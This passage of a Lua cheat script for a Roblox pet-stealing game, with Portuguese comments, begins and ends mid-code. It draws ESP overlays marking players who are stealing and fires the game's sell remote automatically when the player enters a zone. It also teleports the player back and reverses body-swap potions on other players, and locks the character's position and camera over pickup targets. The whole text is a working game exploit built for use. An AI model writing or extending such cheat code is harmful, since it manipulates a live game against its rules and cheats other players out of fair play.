            for _, plr in ipairs(Players:GetPlayers()) do

                if plr ~= LocalPlayer and plr:GetAttribute("Stealing") then

                    local idx = plr:GetAttribute("StealingIndex")

                    if idx ~= nil and idx ~= "" then

                        local plot = findPlotForPlayer(plr)

                        local part = getPlotSignAdorneePart(plot)

                        if part and part:IsDescendantOf(Workspace) then

                            active[plr.UserId] = true

                            local petEntry = resolveStolenPetEntry(plr, idx)

                            local petName = petEntry and petEntry.name or tostring(idx)

                            local stealKey = tostring(idx) .. "|" .. tostring(petEntry and petEntry.uid or "") .. "|" .. part:GetFullName()

                            local row = byUser[plr.UserId]

                            if row and (row.stealKey ~= stealKey or row.adornee ~= part) then

                                clearRow(plr.UserId)

                                row = nil

                            end

                            if not byUser[plr.UserId] then

                                local bb = Instance.new("BillboardGui")

                                bb.Name = "StealPlotESP_" .. plr.Name

                                bb.Adornee = part

                                bb.AlwaysOnTop = true

                                bb.Size = UDim2.new(0, 220, 0, 240)

                                bb.StudsOffset = Vector3.new(0, 8, 0)

                                bb.MaxDistance = 650

                                bb.LightInfluence = 0

                                bb.Parent = espGui

                                local root = Instance.new("Frame")

                                root.Name = "Root"

                                root.Size = UDim2.new(1, 0, 1, 0)

                                root.BackgroundColor3 = Color3.fromRGB(8,8,12)

                                root.BackgroundTransparency = 0.35

                                root.BorderSizePixel = 0

                                root.Parent = bb

                                Instance.new("UICorner", root).CornerRadius = UDim.new(0, 7)
                                local rootStroke = Instance.new("UIStroke", root)
                                rootStroke.Color = Color3.fromRGB(80, 140, 255)
                                rootStroke.Thickness = 1.5
                                rootStroke.Transparency = 0.4

                                -- Username centralizado
                                local title = Instance.new("TextLabel")
                                title.Name = "Title"
                                title.Size = UDim2.new(1, 0, 0, 20)
                                title.Position = UDim2.new(0, 0, 0, 4)
                                title.BackgroundTransparency = 1
                                title.Font = Enum.Font.GothamBlack
                                title.TextSize = 13
                                title.TextColor3 = Color3.fromRGB(255, 255, 255)
                                title.TextStrokeTransparency = 0.6
                                title.TextXAlignment = Enum.TextXAlignment.Center
                                title.TextTruncate = Enum.TextTruncate.AtEnd
                                title.Text = plr.DisplayName
                                title.Parent = root

                                -- Brainrot/s verde centralizado
                                local genInfo = Instance.new("TextLabel", root)
                                genInfo.Name = "GenInfo"
                                genInfo.Size = UDim2.new(1, 0, 0, 16)
                                genInfo.Position = UDim2.new(0, 0, 0, 22)
                                genInfo.BackgroundTransparency = 1
                                genInfo.Font = Enum.Font.GothamBlack
                                genInfo.TextSize = 13
                                genInfo.TextColor3 = Color3.fromRGB(60, 220, 100)
                                genInfo.TextStrokeTransparency = 0.5
                                genInfo.TextXAlignment = Enum.TextXAlignment.Center
                                genInfo.Text = (petEntry and petEntry.genText) and petEntry.genText or ""

                                -- Preview 3D ANIMADO (idle ping-pong)
                                local previewHost = Instance.new("Frame")
                                previewHost.Name = "PreviewHost"
                                previewHost.Size = UDim2.new(1, -10, 0, 150)
                                previewHost.Position = UDim2.new(0, 5, 0, 40)
                                previewHost.BackgroundTransparency = 1
                                previewHost.BorderSizePixel = 0
                                previewHost.Parent = root

                                task.defer(function()
                                    if not previewHost.Parent then return end
                                    pcall(function()
                                        local modelsFolder = ReplicatedStorage:FindFirstChild("Models")
                                        local animalsFolder = modelsFolder and modelsFolder:FindFirstChild("Animals")
                                        local lookupName = petEntry and (petEntry.index or petEntry.Index or petEntry.name) or petName
                                        local srcModel = animalsFolder and animalsFolder:FindFirstChild(lookupName)
                                        if not srcModel then return end
                                        local vp = Instance.new("ViewportFrame")
                                        vp.Size = UDim2.new(1,0,1,0)
                                        vp.BackgroundTransparency = 1
                                        vp.BorderSizePixel = 0
                                        vp.Parent = previewHost
                                        Instance.new("UICorner", vp).CornerRadius = UDim.new(0, 8)
                                        local wm = Instance.new("WorldModel", vp)
                                        local clone = srcModel:Clone()
                                        clone.Parent = wm
                                        local animsRoot = ReplicatedStorage:FindFirstChild("Animations")
                                        local animalsAnims = animsRoot and animsRoot:FindFirstChild("Animals")
                                        local thisAnimFolder = animalsAnims and animalsAnims:FindFirstChild(lookupName)
                                        local idleAnim = thisAnimFolder and thisAnimFolder:FindFirstChild("Idle")
                                        if idleAnim and idleAnim:IsA("Animation") then
                                            local animator
                                            for _, d in ipairs(clone:GetDescendants()) do
                                                if d:IsA("Animator") then animator = d; break end
                                            end
                                            if not animator then
                                                local ac = Instance.new("AnimationController", clone)
                                                animator = Instance.new("Animator", ac)
                                            end
                                            if animator then
                                                local track = animator:LoadAnimation(idleAnim)
                                                if track then
                                                    track.Looped = false
                                                    local fwd = true
                                                    local function playDir()
                                                        if not vp.Parent then return end
                                                        if fwd then track.TimePosition = 0; track:AdjustSpeed(1)
                                                        else track.TimePosition = track.Length; track:AdjustSpeed(-1) end
                                                        track:Play()
                                                    end
                                                    track.Stopped:Connect(function() fwd = not fwd; playDir() end)
                                                    playDir()
                                                end
                                            end
                                        end
                                        local cam = Instance.new("Camera", vp)
                                        local cf, size = clone:GetBoundingBox()
                                        clone:PivotTo(cf * CFrame.Angles(0, math.rad(180), 0))
                                        cf = clone:GetPivot()
                                        local maxSize = math.max(size.X, size.Y, size.Z)
                                        local dist = math.max(maxSize * 0.8, 1.5)
                                        local camPos = cf.Position + (cf.LookVector*(dist*1.2)) + (cf.RightVector*(dist*0.5)) + (cf.UpVector*(dist*0.4))
                                        cam.CFrame = CFrame.new(camPos, cf.Position + cf.UpVector*(maxSize*0.2))
                                        vp.CurrentCamera = cam
                                    end)
                                end)

                                -- Nome do pet vermelho
                                local petLbl = Instance.new("TextLabel", root)
                                petLbl.Size = UDim2.new(1, 0, 0, 16)
                                petLbl.Position = UDim2.new(0, 0, 1, -36)
                                petLbl.BackgroundTransparency = 1
                                petLbl.Font = Enum.Font.GothamBlack
                                petLbl.TextSize = 12
                                petLbl.TextColor3 = Color3.fromRGB(255, 60, 60)
                                petLbl.TextStrokeTransparency = 0.4
                                petLbl.TextXAlignment = Enum.TextXAlignment.Center
                                petLbl.TextTruncate = Enum.TextTruncate.AtEnd
                                petLbl.Text = petName

                                -- ⚡ STEALING embaixo
                                local sub = Instance.new("TextLabel", root)
                                sub.Name = "Sub"
                                sub.Size = UDim2.new(1, 0, 0, 16)
                                sub.Position = UDim2.new(0, 0, 1, -20)
                                sub.BackgroundTransparency = 1
                                sub.Font = Enum.Font.Ubuntu
                                sub.TextSize = 11
                                sub.TextColor3 = Color3.fromRGB(80, 140, 255)
                                sub.TextStrokeTransparency = 0.5
                                sub.TextXAlignment = Enum.TextXAlignment.Center
                                sub.Text = "⚡ STEALING"

                                byUser[plr.UserId] = { bill = bb, adornee = part, stealKey = stealKey }

                            else

                                row = byUser[plr.UserId]

                                if row and row.bill and row.bill.Parent then

                                    local rootFrame = row.bill:FindFirstChild("Root")

                                    if rootFrame then

                                        local t = rootFrame:FindFirstChild("Title")

                                        if t and t:IsA("TextLabel") then

                                            t.Text = plr.DisplayName

                                        end

                                        local gi = rootFrame:FindFirstChild("GenInfo")
                                        if gi and gi:IsA("TextLabel") then
                                            gi.Text = (petEntry and petEntry.genText and petEntry.genText ~= "") and petEntry.genText or ""
                                        end

                                    end

                                end

                            end

                        end

                    end

                end

            end

            local stale = {}

            for uid in pairs(byUser) do

                if not active[uid] then table.insert(stale, uid) end

            end

            for _, uid in ipairs(stale) do clearRow(uid) end

        end

    end

end)

-- ══════════════════════════════════════════════════════════════════════════
-- ▸ BULLYS SELL · Backend (sem UI; controlado pelo mini ACTIONS panel) ◂
-- ══════════════════════════════════════════════════════════════════════════
task.spawn(function()
    task.wait(2)

    local Net = ReplicatedStorage.Packages.Net
    local SellRemote
    local function findSellRemote()
        local ch = Net:GetChildren()
        for i, v in ipairs(ch) do
            if v.Name == "RE/PlotService/Sell" then SellRemote = ch[i+1]; return end
        end
    end
    findSellRemote()

    local SellSync, SellAnimals
    do
        local ok1, s = pcall(function() return require(ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Synchronizer")) end)
        if ok1 then SellSync = s end
        local ok2, a = pcall(function() return require(ReplicatedStorage:WaitForChild("Datas"):WaitForChild("Animals")) end)
        if ok2 then SellAnimals = a end
    end
    if not SellSync or not SellAnimals then return end

    local slotMap = {}
    for i=1,10 do slotMap[i]={hasBrainrot=false,name=""} end
    local cachedPlotName = nil

    local function findMyPlotName()
        local plots = workspace:FindFirstChild("Plots")
        if not plots then return nil end
        for _, plot in ipairs(plots:GetChildren()) do
            local ok, ch = pcall(function() return SellSync:Get(plot.Name) end)
            if ok and ch then
                local owner = ch:Get("Owner")
                if owner then
                    local isMe = false
                    if typeof(owner)=="Instance" and owner:IsA("Player") then isMe=(owner==LocalPlayer)
                    elseif type(owner)=="table" then isMe=(owner.UserId==LocalPlayer.UserId) end
                    if isMe then return plot.Name end
                end
            end
        end
        return nil
    end

    local function scanMyPlot()
        if not cachedPlotName then cachedPlotName = findMyPlotName() end
        if not cachedPlotName then return end
        local plots = workspace:FindFirstChild("Plots")
        if not (plots and plots:FindFirstChild(cachedPlotName)) then cachedPlotName=nil; return end
        local ok, ch = pcall(function() return SellSync:Get(cachedPlotName) end)
        if not ok or not ch then return end
        local animalList = ch:Get("AnimalList")
        for i=1,10 do slotMap[i]={hasBrainrot=false,name=""} end
        if type(animalList)~="table" then return end
        for slot, data in pairs(animalList) do
            local s = tonumber(slot)
            if s and s>=1 and s<=10 and type(data)=="table" and data.Index then
                local info = SellAnimals[data.Index]
                slotMap[s]={hasBrainrot=true, name=((info and info.DisplayName) or data.Index or "?"):upper()}
            end
        end
    end

    -- ── PROXIMITY ZONE ────────────────────────────────────────────────
    local proxEnabled = false
    local proxRing    = nil
    local proxZone    = nil
    local wasInRange  = false
    local ZONE_W, ZONE_D = 33/2, 62/2
    local ZONE_OFFSET_X = -0.42
    local ZONE_OFFSET_Z = -37.29

    local function findMyPlot()
        local plots = workspace:FindFirstChild("Plots")
        if not plots then return nil end
        for _, plot in ipairs(plots:GetChildren()) do
            local okCh, ch = pcall(function() return SellSync:Get(plot.Name) end)
            if okCh and ch then
                local owner = ch:Get("Owner")
                if owner then
                    local uid = (typeof(owner)=="Instance" and owner:IsA("Player") and owner.UserId)
                             or (type(owner)=="table" and owner.UserId)
                    if uid == LocalPlayer.UserId then return plot end
                end
            end
        end
        return nil
    end

    local function buildProxZone()
        local plot = findMyPlot()
        if not plot then return false end
        local root = plot:FindFirstChild("MainRootPart") or plot:FindFirstChildWhichIsA("BasePart")
        if not root then return false end
        local worldOffset = root.CFrame:VectorToWorldSpace(Vector3.new(ZONE_OFFSET_X, 0, ZONE_OFFSET_Z))
        local rp = root.Position
        local cx = rp.X + worldOffset.X
        local cz = rp.Z + worldOffset.Z
        proxZone = {cx=cx, cz=cz,
            xMin=cx-ZONE_W, xMax=cx+ZONE_W,
            zMin=cz-ZONE_D, zMax=cz+ZONE_D,
            rootY=rp.Y}
        return true
    end

    local function destroyRing()
        if proxRing and proxRing.Parent then proxRing:Destroy() end
        proxRing = nil
    end

    local function createRing()
        destroyRing()
        if not proxZone then return end
        local floorY = proxZone.rootY + 0.2
        local p = Instance.new("Part")
        p.Name = "BullysSellProxRing"
        p.Size = Vector3.new(ZONE_W*2, 0.4, ZONE_D*2)
        p.CFrame = CFrame.new(proxZone.cx, floorY, proxZone.cz)
        p.Anchored = true; p.CanCollide = false; p.CastShadow = false
        p.Material = Enum.Material.Neon
        p.BrickColor = BrickColor.new("White")
        p.Transparency = 0.2
        local char = LocalPlayer.Character
        p.Parent = char or workspace
        proxRing = p
    end

    local function activateProx()
        proxEnabled = true
        wasInRange  = false
        if not buildProxZone() then
            task.spawn(function()
                for _=1,20 do
                    if buildProxZone() then createRing(); return end
                    task.wait(0.5)
                end
            end)
        else
            createRing()
        end
    end

    local function deactivateProx()
        proxEnabled = false
        wasInRange  = false
        destroyRing()
        proxZone = nil
    end

    -- ── RANDOM SELL ───────────────────────────────────────────────────
    local lastSellTime = 0
    local function doRandomSell()
        if not SellRemote then return end
        local now = tick()
        if now - lastSellTime < 0.5 then return end
        lastSellTime = now
        local filled={}
        for s=1,10 do if slotMap[s].hasBrainrot then table.insert(filled,s) end end
        if #filled==0 then return end
        local pick=filled[math.random(1,#filled)]
        SellRemote:FireServer(pick)
    end

    -- ── FLOOR ALERT ───────────────────────────────────────────────────
    local AlertSound=Instance.new("Sound")
    AlertSound.SoundId="rbxassetid://"..(Config.SellSoundId or "5676756526")
    AlertSound.Volume=Config.SellVolume or 3
    AlertSound.Parent=PlayerGui

    local AlertGui=PlayerGui:FindFirstChild("BullysSellAlert")
    if AlertGui then AlertGui:Destroy() end
    AlertGui=Instance.new("ScreenGui")
    AlertGui.Name="BullysSellAlert"; AlertGui.ResetOnSpawn=false; AlertGui.Parent=PlayerGui

    local AlertFrame=Instance.new("Frame", AlertGui)
    AlertFrame.Size=UDim2.new(0,500,0,70); AlertFrame.Position=UDim2.new(0.5,-250,0.18,0)
    AlertFrame.BackgroundTransparency=1; AlertFrame.BorderSizePixel=0

    local AlertText=Instance.new("TextLabel", AlertFrame)
    AlertText.Size=UDim2.new(1,0,1,0); AlertText.BackgroundTransparency=1
    AlertText.Text="!! FIRST FLOOR IS NOT FULL !!"
    AlertText.TextColor3=Color3.fromRGB(255,200,0); AlertText.TextSize=28
    AlertText.Font=Enum.Font.GothamBold; AlertText.TextXAlignment=Enum.TextXAlignment.Center
    AlertText.TextStrokeTransparency=0.2; AlertText.TextStrokeColor3=Color3.fromRGB(0,0,0)
    AlertText.TextTransparency=1

    local alertCooldown=false
    local alertAlreadyFired=false
    local function showAlert()
        if not (Config.SellAlertOn == true) or alertCooldown then return end
        if alertAlreadyFired then return end
        alertAlreadyFired=true
        alertCooldown=true
        AlertSound:Play()
        TweenService:Create(AlertText,TweenInfo.new(0.15),{TextTransparency=0}):Play()
        local blinking=true
        task.spawn(function()
            local cols={Color3.fromRGB(255,200,0),Color3.fromRGB(220,30,30)}
            local i=1
            while blinking do
                TweenService:Create(AlertText,TweenInfo.new(0.25),{TextColor3=cols[i]}):Play()
                i=(i%2)+1; task.wait(0.3)
            end
        end)
        task.spawn(function()
            task.wait(5)
            blinking=false
            TweenService:Create(AlertText,TweenInfo.new(0.3),{TextTransparency=1}):Play()
            task.delay(0.4,function() alertCooldown=false end)
        end)
    end

    local prevFilled=10
    local function checkFloor()
        if not cachedPlotName then return end
        local filled=0
        for s=1,10 do if slotMap[s].hasBrainrot then filled+=1 end end
        if prevFilled==10 and filled<10 then showAlert() end
        prevFilled=filled
    end

    -- Exports para UI de config (aviso)
    _G.BullysSellTestSound = function()
        task.spawn(function()
            pcall(function()
                AlertSound:Stop()
                AlertSound.SoundId = "rbxassetid://"..(Config.SellSoundId or "5676756526")
                AlertSound.Volume  = Config.SellVolume or 3
            end)
            -- espera até 2s o som carregar antes de tocar
            local t0 = tick()
            while tick() - t0 < 2 do
                if AlertSound.IsLoaded then break end
                task.wait(0.1)
            end
            pcall(function() AlertSound.TimePosition = 0; AlertSound:Play() end)
        end)
    end
    _G.BullysSellRefreshSound = function()
        AlertSound.SoundId = "rbxassetid://"..(Config.SellSoundId or "5676756526")
        AlertSound.Volume  = Config.SellVolume or 3
    end

    -- ── SCAN LOOP + PROXIMITY CHECK ───────────────────────────────────
    local lastScan=0
    RunService.Heartbeat:Connect(function()
        local now=tick()
        if now-lastScan < 0.5 then return end
        lastScan=now
        pcall(scanMyPlot)
        pcall(checkFloor)
        do
            local filled = 0
            for s=1,10 do if slotMap[s].hasBrainrot then filled = filled + 1 end end
            _G.BullysSellFilledCount = filled
        end

        if proxEnabled and proxZone then
            local char=LocalPlayer.Character
            local hrp=char and char:FindFirstChild("HumanoidRootPart")
            if hrp then
                local p=hrp.Position
                local inRange = p.X>=proxZone.xMin and p.X<=proxZone.xMax
                            and p.Z>=proxZone.zMin and p.Z<=proxZone.zMax
                if inRange and not wasInRange then
                    doRandomSell()
                    if proxRing and proxRing.Parent then
                        proxRing.BrickColor=BrickColor.new("Lime green")
                        task.delay(0.5,function()
                            if proxRing and proxRing.Parent then
                                proxRing.BrickColor=BrickColor.new("White")
                            end
                        end)
                    end
                end
                wasInRange=inRange
            end
        end
    end)

    LocalPlayer.CharacterAdded:Connect(function()
        cachedPlotName=nil
        task.wait(3)
        findSellRemote()
        pcall(scanMyPlot)
        if proxEnabled then
            buildProxZone(); createRing()
        end
    end)

    -- Inicializa scan + descoberta do plot
    task.delay(1, function() findSellRemote(); pcall(scanMyPlot) end)

    -- Exports pro mini ACTIONS panel do Bullys
    local function doSlotSell(slot)
        if not SellRemote then return end
        local s = tonumber(slot)
        if not s or s < 1 or s > 10 then return end
        local now = tick()
        if now - lastSellTime < 0.5 then return end
        lastSellTime = now
        SellRemote:FireServer(s)
    end

    _G.BullysSellRandom       = doRandomSell
    _G.BullysSellSlot         = doSlotSell
    _G.BullysSellToggleProx   = function()
        if proxEnabled then deactivateProx() else activateProx() end
    end
    _G.BullysSellIsProxActive = function() return proxEnabled end
end)

-- ══════════════════════════════════════════════════════════════════════════
-- ▸ Anti Swap System [Beta] · Detecta SOMENTE body-swap real ◂
-- ══════════════════════════════════════════════════════════════════════════
task.spawn(function()
    local CHECK_INTERVAL = 0.03
    local SWAP_THRESHOLD = 20
    local SWAP_RANGE     = 80
    local COOLDOWN       = 0.5

    local lastValidPos   = nil
    local lastSampleTime = tick()
    local lastActionTime = 0

    -- Tracking contínuo: quem está com swap tool NA MÃO (atualiza a cada 0.1s)
    local swapHolders = {}
    local SWAP_NAMES = {
        ["body swap potion"] = true,
        ["swap potion"] = true,
    }

    task.spawn(function()
        while true do
            task.wait(0.1)
            local holders = {}
            for _, p in ipairs(Players:GetPlayers()) do
                if p ~= LocalPlayer and p.Character then
                    for _, child in ipairs(p.Character:GetChildren()) do
                        if child:IsA("Tool") then
                            local n = child.Name:lower()
                            if SWAP_NAMES[n] or n:find("swap") then
                                holders[p] = tick()
                                break
                            end
                        end
                    end
                end
            end
            swapHolders = holders
        end
    end)

    local function findSwapAttacker(oldPos)
        local best, bestDist = nil, math.huge
        for _, p in ipairs(Players:GetPlayers()) do
            if p ~= LocalPlayer and p.Character then
                local pHrp = p.Character:FindFirstChild("HumanoidRootPart")
                if pHrp then
                    local d = (pHrp.Position - oldPos).Magnitude
                    if d < SWAP_RANGE and d < bestDist then
                        -- Check 1: cache (tinha swap na mão recentemente)
                        local hadSwap = swapHolders[p]
                        if hadSwap and (tick() - hadSwap) < 3 then
                            return p, d
                        end
                        -- Check 2: tem swap na mão AGORA
                        for _, child in ipairs(p.Character:GetChildren()) do
                            if child:IsA("Tool") then
                                local n = child.Name:lower()
                                if SWAP_NAMES[n] or n:find("swap") then
                                    return p, d
                                end
                            end
                        end
                        -- Check 3: tem swap no Backpack (guardou logo após usar)
                        local bp = p:FindFirstChild("Backpack")
                        if bp then
                            for _, child in ipairs(bp:GetChildren()) do
                                if child:IsA("Tool") then
                                    local n = child.Name:lower()
                                    if SWAP_NAMES[n] or n:find("swap") then
                                        best = p; bestDist = d
                                        break
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end
        -- Retorna nil se ninguém tem swap = NÃO era swap real
        return nil, bestDist
    end

    while true do
        task.wait(CHECK_INTERVAL)

        if Config.AntiSwapEnabled == false then
            lastValidPos = nil; lastSampleTime = tick()
            continue
        end

        local char = LocalPlayer.Character
        local hrp = char and char:FindFirstChild("HumanoidRootPart")
        if not hrp then lastValidPos = nil; lastSampleTime = tick(); continue end

        -- Ignora durante TP do próprio hub
        if State and State.isTpMoving then
            lastValidPos = hrp.Position; lastSampleTime = tick(); continue
        end

        local now = tick()
        local dt = now - lastSampleTime

        if lastValidPos and dt <= 0.25 then
            local delta = (hrp.Position - lastValidPos).Magnitude

            if delta > SWAP_THRESHOLD and (now - lastActionTime) >= COOLDOWN then
                local oldPos = lastValidPos

                -- SÓ ATIVA se alguém tem swap tool
                local attacker = findSwapAttacker(oldPos)

                if attacker then
                    lastActionTime = now

                    -- Restaura posição
                    pcall(function()
                        hrp.CFrame = CFrame.new(oldPos)
                        hrp.AssemblyLinearVelocity = Vector3.zero
                        hrp.AssemblyAngularVelocity = Vector3.zero
                    end)

                    if ShowNotification then
                        pcall(ShowNotification, "ANTI-SWAP", "Blocked: " .. attacker.Name)
                    end

                    if _G.BullysReverseSwapHandler then
                        pcall(_G.BullysReverseSwapHandler, attacker, oldPos, hrp.Position)
                    end

                    lastValidPos = oldPos; lastSampleTime = now
                    continue
                end
                -- Ninguém com swap = lag/TP/morte, IGNORA
            end
        end

        lastValidPos = hrp.Position; lastSampleTime = now
    end
end)
-- Helper global pra integrar custom reverse (opcional)
_G.BullysAntiSwapEnable  = function() Config.AntiSwapEnabled = true;  if SaveConfig then pcall(SaveConfig) end end
_G.BullysAntiSwapDisable = function() Config.AntiSwapEnabled = false; if SaveConfig then pcall(SaveConfig) end end

-- Reverse handler default: pega o item de swap na mão e aplica de volta no atacante
local function bullysFindSwapTool()
    -- Prioridade 1: match exato "Body Swap Potion"
    -- Prioridade 2: qualquer tool com "swap/body" no nome (fallback)
    local exact, fallback = nil, nil
    local function scan(parent)
        if not parent then return end
        for _, t in ipairs(parent:GetChildren()) do
            if t:IsA("Tool") then
                local nLower = t.Name:lower()
                if nLower == "body swap potion" then
                    exact = exact or t
                elseif (nLower:find("swap") or nLower:find("body")) and not fallback then
                    fallback = t
                end
            end
        end
    end
    scan(LocalPlayer:FindFirstChild("Backpack"))
    scan(LocalPlayer.Character)
    scan(LocalPlayer:FindFirstChild("StarterGear"))
    return exact or fallback
end

local function bullysDefaultReverseSwap(attacker, oldPos, newPos)
    -- Pega Body Swap Potion na mão e aplica de volta no atacante
    pcall(function()
        local tool = bullysFindSwapTool()
        if not tool then return end

        local char = LocalPlayer.Character
        local hum  = char and char:FindFirstChildOfClass("Humanoid")
        if not char or not hum then return end

        -- Equipa o tool se ainda não estiver na mão
        if tool.Parent ~= char then
            pcall(function() hum:EquipTool(tool) end)
            task.wait(0.05)
        end

        -- Ativa o tool (mesma mecânica que o jogador usaria manualmente)
        pcall(function() tool:Activate() end)
    end)
end

_G.BullysReverseSwapHandler = bullysDefaultReverseSwap

-- ── AUTO PICKUP ──────────────────────────────────────────────────────────────
-- Pega automaticamente o brainrot mais próximo na SUA base.
-- Só fica realmente ativo se o player estiver dentro da própria base.
-- Não teleporta — apenas dispara o prompt de coleta.
-- Para se o player já estiver segurando o brainrot (tool equipada).
-- VERBATIM IMPORT do hub Logística (sem UI; integrado com mini ACTIONS panel).
local function initAutoPickup()
    local autoPickupActive = false

    if not Config.AutoPickupKey    then Config.AutoPickupKey    = "B"    end
    if Config.AutoPickupActive == nil then Config.AutoPickupActive = false end
    if Config.AutoPickupKick == nil   then Config.AutoPickupKick   = false end

    -- ── Encontra o plot do LocalPlayer ───────────────────────────────────────
    local function findMyPlot()
        local plots = Workspace:FindFirstChild("Plots")
        if not plots then return nil end
        local ok, Sync = pcall(function()
            return require(ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Synchronizer"))
        end)
        if not ok or not Sync then return nil end
        for _, plot in ipairs(plots:GetChildren()) do
            local okCh, ch = pcall(function() return Sync:Get(plot.Name) end)
            if okCh and ch then
                local owner = ch:Get("Owner")
                if owner then
                    local uid = (typeof(owner) == "Instance" and owner:IsA("Player") and owner.UserId)
                             or (type(owner) == "table" and owner.UserId)
                    if uid == LocalPlayer.UserId then return plot end
                end
            end
        end
        return nil
    end

    -- ── Verifica se está dentro da própria base ───────────────────────────────
    local function isInsideMyBase(hrp, myPlot)
        if not hrp or not myPlot then return false end
        local sign = myPlot:FindFirstChild("PlotSign")
        if not sign then return false end
        local signPart = sign:IsA("BasePart") and sign
                      or sign:FindFirstChildWhichIsA("BasePart", true)
        if not signPart then return false end
        local d = (Vector2.new(hrp.Position.X, hrp.Position.Z) - Vector2.new(signPart.Position.X, signPart.Position.Z)).Magnitude
        return d < 200
    end

    -- ── Verifica se o player está segurando um brainrot (não o carpet nem ferramentas do script) ───
    local IGNORED_TOOLS = {
        ["Flying Carpet"] = true,
        ["Quantum Cloner"] = true,
        ["Balloon"] = true,
    }
    local function isHoldingBrainrot()
        local char = LocalPlayer.Character
        if not char then return false end
        local carpetName = (Config.TpSettings and Config.TpSettings.Tool) or "Flying Carpet"
        for _, v in ipairs(char:GetChildren()) do
            if v:IsA("Tool") then
                -- Ignora o carpet configurado e ferramentas conhecidas
                if v.Name == carpetName then continue end
                if IGNORED_TOOLS[v.Name] then continue end
                return true
            end
        end
        return false
    end

    -- ── Encontra o ProximityPrompt de coleta mais próximo na base ────────────
    local PICKUP_KEYWORDS = {"collect","coletar","pickup","pick up","pegar","grab","take"}
    local function findNearestPickupPrompt(hrp, myPlot)
        if not hrp or not myPlot then return nil, nil end
        local best, bestDist, bestPart = nil, math.huge, nil
        for _, obj in ipairs(myPlot:GetDescendants()) do
            if obj:IsA("ProximityPrompt") and obj.Enabled then
                local txt = (obj.ActionText or ""):lower()
                local matched = false
                for _, kw in ipairs(PICKUP_KEYWORDS) do
                    if txt:find(kw) then matched = true; break end
                end
                if matched then
                    local part = obj.Parent
                    if part and part:IsA("Attachment") then part = part.Parent end
                    if part and part:IsA("BasePart") then
                        local d = (hrp.Position - part.Position).Magnitude
                        if d < bestDist then
                            bestDist = d
                            best     = obj
                            bestPart = part
                        end
                    end
                end
            end
        end
        return best, bestPart
    end

    -- Stub: sem UI de targets list, mantém ref pro selecionado (não usado sem UI)
    local selectedPickupTarget = nil

    -- Stub: sem lista UI, no-op
    local function refreshTargetsList(myPlot) end

    -- Stub: status label não existe, redireciona pra _G hook (mini panel) opcional
    local statusLbl = setmetatable({}, { __newindex = function() end, __index = function() return "" end })

    local function toggle()
        autoPickupActive = not autoPickupActive
        Config.AutoPickupActive = autoPickupActive
        ShowNotification("AUTO PICKUP", autoPickupActive and "ATIVADO" or "DESATIVADO")
        if autoPickupActive then
            -- Atualiza lista imediatamente ao ativar
            task.spawn(function()
                local plt = findMyPlot()
                refreshTargetsList(plt)
            end)
        end
        if _G._pickupMiniRefresh then pcall(_G._pickupMiniRefresh) end
        SaveConfig()
    end

    _G.AutoPickupToggle = toggle
    _G.AutoPickupOnToggle = function(active)
        autoPickupActive = active
        Config.AutoPickupActive = active
        if _G._pickupMiniRefresh then pcall(_G._pickupMiniRefresh) end
    end

    UserInputService.InputBegan:Connect(function(input, processed)
        if processed then return end
        if Config.AutoPickupKey and Config.AutoPickupKey ~= "" then
            if input.KeyCode == Enum.KeyCode[Config.AutoPickupKey] then toggle() end
        end
    end)

    autoPickupActive = Config.AutoPickupActive == true

    -- ── Loop principal ────────────────────────────────────────────────────────
    task.spawn(function()
        local myPlot           = nil
        local plotRefreshTimer = 0
        local listRefreshTimer = 0
        local wasHolding       = false
        local lockConn         = nil
        local currentLockPart  = nil
        local camConn          = nil

        local function stopLock()
            if lockConn then lockConn:Disconnect(); lockConn = nil end
            if camConn  then camConn:Disconnect();  camConn  = nil end
            currentLockPart = nil
            _G._autoPickupLocked = false
            -- Restaura câmera padrão
            pcall(function()
                local cam = workspace.CurrentCamera
                if cam then cam.CameraType = Enum.CameraType.Custom end
            end)
        end

        local function startLock(targetPart)
            if currentLockPart == targetPart then return end
            stopLock()
            currentLockPart = targetPart
            _G._autoPickupLocked = true

            -- Mata BodyPosition do AutoBack (briga com o lock CFrame e gera erros)
            pcall(function()
                local char = LocalPlayer.Character
                local hrp  = char and char:FindFirstChild("HumanoidRootPart")
                if hrp then
                    local bp = hrp:FindFirstChild("TP_BodyPosition")
                    if bp then bp:Destroy() end
                end
            end)

            -- Equipa o carpet para o travamento funcionar no ar
            pcall(function()
                local char = LocalPlayer.Character
                local hum  = char and char:FindFirstChildOfClass("Humanoid")
                if hum then
                    local carpetName = (Config.TpSettings and Config.TpSettings.Tool) or "Flying Carpet"
                    local carpet = LocalPlayer.Backpack:FindFirstChild(carpetName) or char:FindFirstChild(carpetName)
                    if carpet then hum:EquipTool(carpet) end
                end
            end)

            -- Configura câmera scriptável olhando para o target
            pcall(function()
                local cam = workspace.CurrentCamera
                if cam then cam.CameraType = Enum.CameraType.Scriptable end
            end)

            lockConn = RunService.Heartbeat:Connect(function()
                if not autoPickupActive then stopLock(); return end
                local char = LocalPlayer.Character
                local hrp  = char and char:FindFirstChild("HumanoidRootPart")
                if not hrp or not targetPart or not targetPart.Parent then stopLock(); return end
                hrp.CFrame = CFrame.new(targetPart.Position + Vector3.new(0, 9, 0)) * (hrp.CFrame - hrp.Position)
                hrp.AssemblyLinearVelocity  = Vector3.zero
                hrp.AssemblyAngularVelocity = Vector3.zero
            end)

            -- Câmera acompanha personagem olhando para o target
            camConn = RunService.RenderStepped:Connect(function()
                if not autoPickupActive then return end
                local char = LocalPlayer.Character
                local hrp  = char and char:FindFirstChild("HumanoidRootPart")
                if not hrp or not targetPart or not targetPart.Parent then return end
                local cam = workspace.CurrentCamera
                if not cam then return end
                -- Posição da câmera: atrás e acima do personagem
                local camOffset = Vector3.new(0, 6, 14)
                local lookDir   = (targetPart.Position - hrp.Position)
                local lookDirXZ = Vector3.new(lookDir.X, 0, lookDir.Z)
                local backward  = lookDirXZ.Magnitude > 0 and -lookDirXZ.Unit or Vector3.new(0, 0, 1)
                local camPos    = hrp.Position + backward * 14 + Vector3.new(0, 6, 0)
                cam.CFrame = CFrame.lookAt(camPos, targetPart.Position + Vector3.new(0, 2, 0))
            end)
        end

        -- Encontra o melhor brainrot ≥10M da base (selecionado ou o de maior gen)
        local function getBestBaseTarget()
            -- Prioridade: target selecionado manualmente na lista
            if selectedPickupTarget and selectedPickupTarget.data then
                local d = selectedPickupTarget.data
                if (tonumber(d.genValue) or 0) >= 10000000 then
                    local part = findAdorneeGlobal(d)
                    if part and part.Parent then
                        return part, d
                    end
                end
